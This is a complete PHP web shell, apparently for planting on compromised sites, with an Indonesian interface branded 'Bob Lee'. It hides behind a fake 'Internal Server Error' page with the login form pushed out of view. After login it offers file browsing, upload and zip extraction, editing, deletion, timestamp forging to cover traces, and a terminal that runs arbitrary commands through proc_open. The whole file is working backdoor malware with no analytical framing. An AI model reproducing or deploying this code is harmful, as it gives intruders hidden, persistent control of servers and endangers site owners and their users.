<?php
session_start();

$valid_user_hash = '$2a$12$zmRRPWJd63e.QYtiMa0QC.bjUmfhDTgbRl3oHA9UbkSVqKJPRCdES'; // class 
$valid_pass_hash = '$2a$12$Iipm7UJMHmjdprxR.PWBSuCNQmL0.boyTjIlEMsIrRFlGyj/w78Uy'; // admin

if (isset($_POST['user'], $_POST['pass'])) {
    if (
        password_verify($_POST['user'], $valid_user_hash) &&
        password_verify($_POST['pass'], $valid_pass_hash)
    ) {
        $_SESSION['login'] = true;
    } else {
        $error = "Login gagal, salah!";
    }
}

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Internal Server Error</title>
<style>
    body{
        margin:0;
        font-family:Arial, sans-serif;
        background:#fff;
        color:#000;
    }

    /* paksa halaman tinggi */
    .spacer{
        height:160vh;
    }

    form{
        width:260px;
        margin:0 0 40px 30px;
    }

    h2{
        font-size:16px;
        font-weight:normal;
        margin-bottom:10px;
    }

    input{
        width:100%;
        padding:8px;
        margin-bottom:8px;
        box-sizing:border-box;
    }

    button{
        width:100%;
        padding:8px;
        cursor:pointer;
    }

    .error{
        color:#c00;
        font-size:12px;
        margin-bottom:6px;
    }
</style>
</head>
<body>

<!-- ruang kosong biar HARUS scroll -->
<div class="spacer"></div>


    <form method="post">
        <h2>🔐 Login</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <input type="text" name="user" placeholder="Username" required>
        <input type="password" name="pass" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
</body>
</html>
<?php
exit;
}

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();

function formatSize($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

if (isset($_GET['delete'])) {
    $target = realpath($path . '/' . $_GET['delete']);
    if (strpos($target, $path) === 0 && is_writable($target)) {
        if (is_file($target)) unlink($target);
        elseif (is_dir($target)) rmdir($target);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($path . '/' . $_POST['rename_from']);
    $to = $path . '/' . basename($_POST['rename_to']);
    if (strpos($from, $path) === 0 && file_exists($from)) {
        rename($from, $to);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['edit_date_file'], $_POST['new_date'])) {
    $target = realpath($path . '/' . $_POST['edit_date_file']);
    if (strpos($target, $path) === 0 && file_exists($target)) {
        $timestamp = strtotime($_POST['new_date']);
        if ($timestamp !== false) {
            touch($target, $timestamp);
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['new_folder'])) {
    mkdir($path . '/' . basename($_POST['new_folder']));
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['new_file'])) {
    file_put_contents($path . '/' . basename($_POST['new_file']), '');
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . '/' . basename($_FILES['upload']['name']));
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (!empty($_FILES['uploads'])) {
    foreach ($_FILES['uploads']['name'] as $i => $name) {
        if ($_FILES['uploads']['error'][$i] === UPLOAD_ERR_OK) {
            $tmp = $_FILES['uploads']['tmp_name'][$i];
            $dest = $path . '/' . basename($name);
            move_uploaded_file($tmp, $dest);
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (!empty($_FILES['zipfile']['name'])) {
    $zipName = $_FILES['zipfile']['name'];
    $tmpZip  = $_FILES['zipfile']['tmp_name'];
    $destZip = $path . '/' . basename($zipName);

    if (move_uploaded_file($tmpZip, $destZip)) {
        $zip = new ZipArchive;
        if ($zip->open($destZip) === TRUE) {
            $zip->extractTo($path);
            $zip->close();
            unlink($destZip); 
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['save_file'], $_POST['content'])) {
    $file = realpath($path . '/' . $_POST['save_file']);
    if (strpos($file, $path) === 0 && is_file($file)) {
        file_put_contents($file, $_POST['content']);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

$home_shell_path = realpath(dirname(__FILE__));

?>
<!DOCTYPE html>
<html>
<head>
    <title> BOB_LEE </title>
    <style>
        body { 
            font-family: Lucida; 
            background: url('https://i.ibb.co/0yWKG2xW/b5fde3aeac3f67bb67dea13409805809.jpg') no-repeat center center fixed; 
            background-size: cover; 
            color: red; 
            padding: 20px; 
            transition: 0.3s; 
        }
        a { color: white; text-decoration: none; }
        table { width: 100%; background: #ffffff98; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid rgba(107, 201, 207, 1); }
        th { background: #1d1d1dff; }
        input, button, select { margin-top: 5px; padding: 5px; }
        textarea { width: 100%; height: 400px; font-family: monospace; background: #c41414ff; color: white; border: none; padding: 10px; }
        .perm-white { color: red; }
        .perm-green { color: blue; }
        .perm-other { color: yellow; }
        td:nth-child(4), th:nth-child(4) { width: 150px; white-space: nowrap; }
        td:nth-child(5), th:nth-child(5) { width: 120px; white-space: nowrap; }
        td a { color: black; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; }
        .button { background-color: #d9f00aff; color: black; padding: 6px 12px; border: 1px solid #be1df0ff; border-radius: 4px; text-decoration: none; font-weight: bold; cursor: pointer; }
        .button:hover { background-color: #37d1d6ff; }

        body.light { 
            background: url('https://i.ibb.co/0yWKG2xW/b5fde3aeac3f67bb67dea13409805809.jpg') no-repeat center center fixed; 
            background-size: cover; 
            color: #fdfdfdff; 
        }
        body.light table { background: rgba(52, 230, 8, 1); }
        body.light th { background: rgba(255,255,255,0.3); }
        body.light td, body.light th { border: 1px solid #ccc; }
        body.light a { color: #f00909ff; }
        body.light textarea { background: rgba(255,255,255,0.8); color: #c03939ff; }
        body.light .button { background: #eee; color: #c03939ff; border: 1px solid #aaa; }
        body.light .button:hover { background: #ddd; }
    </style>
</head>
<body>

<div class="top-bar">
    <div>
        <h2 style="
            font-weight: 900; 
            font-family: 'Arial Black', Gadget, sans-serif; 
            letter-spacing: 2px;
            color: #fdfdfdff;
        ">Bob Lee</h2> 
        <p style="color: rgba(255, 251, 0, 1); font-weight: bold;">Selalu ikuti kata hatimu! Tapi ingat bawalah otakmu juga!!!</p>
    </div>
    <div>
        <button id="toggleTheme" class="button">🌙 Dark</button>
    </div>
</div>

<script>
    const btn = document.getElementById("toggleTheme");
    const body = document.body;

    if (localStorage.getItem("theme") === "light") {
        body.classList.add("light");
        btn.textContent = "☀️ Light";
    }

    btn.addEventListener("click", () => {
        body.classList.toggle("light");
        if (body.classList.contains("light")) {
            localStorage.setItem("theme", "light");
            btn.textContent = "☀️ Light";
        } else {
            localStorage.setItem("theme", "dark");
            btn.textContent = "🌙 Dark";
        }
    });
</script>

<div class="top-bar">
    <div>
        <strong>Current Path:</strong>
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
        $build = '';
        echo '<a href="?path=' . urlencode($home_shell_path) . '">Home Shell</a>';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $build .= '/' . $part;
            echo '/' . '<a href="?path=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
        }
        ?>
    </div>
    <div>
        <a href="?path=<?php echo urlencode($home_shell_path); ?>" class="button">Home Shell</a>
    </div>
</div>

<?php if ($path !== '/') echo "<a href='?path=" . urlencode(dirname($path)) . "'>⬆️ Keluar Dir</a>"; ?>

<table>
    <tr><th>Nama</th><th>Ukuran</th><th>Perm</th><th>Tanggal</th><th>Rename</th></tr>
    <?php
    $items = scandir($path);
    $dirs = [];
    $files = [];

    foreach ($items as $f) {
        if ($f === '.' || $f === '..') continue;
        $full = $path . '/' . $f;
        if (is_dir($full)) $dirs[] = $f; else $files[] = $f;
    }

    $all = array_merge($dirs, $files);
    foreach ($all as $f):
        $full = $path . '/' . $f;
        $perm_num = substr(sprintf('%o', fileperms($full)), -4);
        $perm_class = $perm_num === '0555' ? 'perm-white' : (in_array($perm_num, ['0644', '0755']) ? 'perm-green' : 'perm-other');
        $mtime = filemtime($full);
    ?>
    <tr>
        <td>
            <?php if (is_dir($full)): ?>
                <span style="color: red;">[DIR] <a href="?path=<?php echo urlencode($full); ?>"><?php echo htmlspecialchars($f); ?></a>
            <?php else: ?>
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>"><?php echo htmlspecialchars($f); ?></a>
            <?php endif; ?>
        </td>
        <td><?php echo is_file($full) ? formatSize(filesize($full)) : '-'; ?></td>
        <td class="<?php echo $perm_class; ?>"><?php echo $perm_num; ?></td>
        <td>
            <form method="post" style="display:inline;">
                <input type="hidden" name="edit_date_file" value="<?php echo htmlspecialchars($f); ?>">
                <input type="datetime-local" name="new_date" value="<?php echo date('Y-m-d\\TH:i', $mtime); ?>">
                <button type="submit">t</button>
            </form>
        </td>
        <td>
            <form method="post" style="display:inline;">
                <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($f); ?>">
                <input type="text" name="rename_to" value="<?php echo htmlspecialchars($f); ?>" style="width: 70px;">
                <button type="submit">r</button>
            </form> -
            <?php if (is_file($full)): ?>
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>">e</a> -
            <?php endif; ?>
            <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" onclick="return confirm('Yakin hapus?')">d</a>
        </td>
    </tr>
    <?php endforeach; ?>
</table>

<h3 style="color: #FFD700;">Upload File</h3>
<form method="post" enctype="multipart/form-data" style="border: 2px solid #FFD700; padding: 15px; width: fit-content; border-radius: 5px;">
    <input type="file" name="upload" style="border: 1px solid #FFD700; padding: 5px; border-radius: 3px;">
    <input type="submit" value="Upload">
</form>

<h3 style="color: #FFD700;">Upload Banyak File</h3>
<form method="post" enctype="multipart/form-data" style="border: 2px solid #FFD700; padding: 15px; width: fit-content; border-radius: 5px;">
    <input type="file" name="uploads[]" multiple style="border: 1px solid #FFD700; padding: 5px; border-radius: 3px;">
    <input type="submit" value="Upload">
</form>

<h3 style="color: #FFD700;">Upload & Extract ZIP</h3>
<form method="post" enctype="multipart/form-data"style="border: 2px solid #FFD700; padding: 15px; width: fit-content; border-radius: 5px;">
    <input type="file" name="zipfile" accept=".zip" style="border: 1px solid #FFD700; padding: 5px; border-radius: 3px;">
    <input type="submit" value="Upload & Extract">
</form>

<h3 style="color: #33ff00ff;">Buat Folder</h3>
<form method="post">
    <input type="text" name="new_folder" placeholder="Nama Folder">
    <input type="submit" value="Buat">
</form>

<h3 style="color: #33ff00ff;">Buat File Kosong</h3>
<form method="post">
    <input type="text" name="new_file" placeholder="Nama File.txt">
    <input type="submit" value="Buat">
</form>

<?php
if (isset($_GET['edit'])):
    $edit = realpath($path . '/' . $_GET['edit']);
    if (strpos($edit, $path) === 0 && is_file($edit)):
        $isi = htmlspecialchars(file_get_contents($edit));
?>
<h3>Edit File: <?php echo basename($edit); ?></h3>
<form method="post">
    <textarea name="content"><?php echo $isi; ?></textarea><br>
    <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
    <input type="submit" value="Save">
    <a href="?path=<?php echo urlencode($path); ?>">⬅️ Kembali</a>
</form>
<?php endif; endif; ?>


<!-- Terminal / CMD Section -->
<h3 style="color: #e40b0bff;">Terminal / CMD</h3>
<form method="post" style="margin-bottom:10px;">
    <input type="text" name="cmd" style="width:80%; padding:8px;" placeholder="Masukkan perintah..." value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
    <input type="submit" value="Run">
</form>

<?php
// ============== KONFIGURASI ==============
// Maks waktu eksekusi (detik)
$TERMINAL_TIMEOUT = 15; 
// Maks output (byte) untuk mencegah memori habis (2MB default)
$TERMINAL_MAX_OUTPUT = 2 * 1024 * 1024; 
// Jika ingin membatasi perintah, aktifkan whitelist dan isi array:
$USE_WHITELIST = false;
$WHITELIST = ['ls','pwd','whoami','cat','id','uname','df','du','ps','top','htop','zip','unzip','curl','wget','sed','grep','awk','tail','head'];

// =========================================

if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    if ($cmd === '') {
        echo "<pre style='background:#111; color:#f33; padding:10px; border:1px solid #444;'>Tidak ada perintah.</pre>";
    } else {
        // Jika menggunakan whitelist, cek perintah pertama
        if ($USE_WHITELIST) {
            $parts = preg_split('/\s+/', $cmd);
            if (!in_array($parts[0], $WHITELIST)) {
                echo "<pre style='background:#111; color:#f33; padding:10px; border:1px solid #444;'>Perintah tidak diizinkan oleh whitelist.</pre>";
                return;
            }
        }

        // Pilih shell yang tersedia (cari bash dulu, fallback ke sh)
        $shell = '/bin/bash';
        if (!is_executable($shell)) $shell = '/bin/sh';

        // Bangun perintah: pindah ke path lalu jalankan shell -lc 'command' (2>&1 digabung)
        $safe_cd = 'cd ' . escapeshellarg($path) . ' 2>/dev/null && ';
        $run_cmd = $safe_cd . escapeshellcmd($shell) . ' -lc ' . escapeshellarg($cmd) . ' 2>&1';

        // Persiapkan proc_open
        $descriptors = [
            0 => ['pipe', 'r'], // stdin
            1 => ['pipe', 'w'], // stdout
            2 => ['pipe', 'w']  // stderr (kadang digabung, tapi tetap ambil)
        ];

        $process = @proc_open($run_cmd, $descriptors, $pipes, null, null);

        if (!is_resource($process)) {
            echo "<pre style='background:#111; color:#f33; padding:10px; border:1px solid #444;'>Gagal membuka proses. Pastikan server mengizinkan exec/proc_open.</pre>";
        } else {
            // non-blocking read
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);
            $output = '';
            $start = time();
            $timed_out = false;

            // tutup stdin supaya proses tidak menunggu input
            fclose($pipes[0]);

            while (true) {
                $read = [$pipes[1], $pipes[2]];
                $write = null;
                $except = null;

                // tunggu sampai ada data atau timeout kecil
                $num = stream_select($read, $write, $except, 1, 0);

                // baca dari pipes bila ada
                if ($num !== false && $num > 0) {
                    foreach ($read as $r) {
                        $chunk = stream_get_contents($r);
                        if ($chunk !== false && $chunk !== '') {
                            $output .= $chunk;
                            // batasi ukuran output
                            if (strlen($output) > $TERMINAL_MAX_OUTPUT) {
                                $output = substr($output, 0, $TERMINAL_MAX_OUTPUT) . "\n\n[Output dipotong (terlalu besar)]";
                                break 2;
                            }
                        }
                    }
                }

                // cek apakah proses sudah selesai
                $status = proc_get_status($process);
                if (!$status['running']) {
                    // baca sisa output
                    $output .= stream_get_contents($pipes[1]);
                    $output .= stream_get_contents($pipes[2]);
                    break;
                }

                // cek timeout
                if ((time() - $start) > $TERMINAL_TIMEOUT) {
                    $timed_out = true;
                    // hentikan proses
                    proc_terminate($process, 9);
                    $output .= "\n\n[Perintah dihentikan karena timeout setelah {$TERMINAL_TIMEOUT} detik]";
                    break;
                }

                // short sleep supaya CPU tidak penuh
                usleep(100000);
            }

            // tutup pipes & proses
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($process);

            // tampilkan output (encode agar aman)
            echo "<pre style='background:#111; color:#0f0; padding:10px; border:1px solid #444;'>";
            echo htmlspecialchars($output !== '' ? $output : "[Tidak ada output]");
            echo "</pre>";
        }
    }
}
?>

</body>
</html>
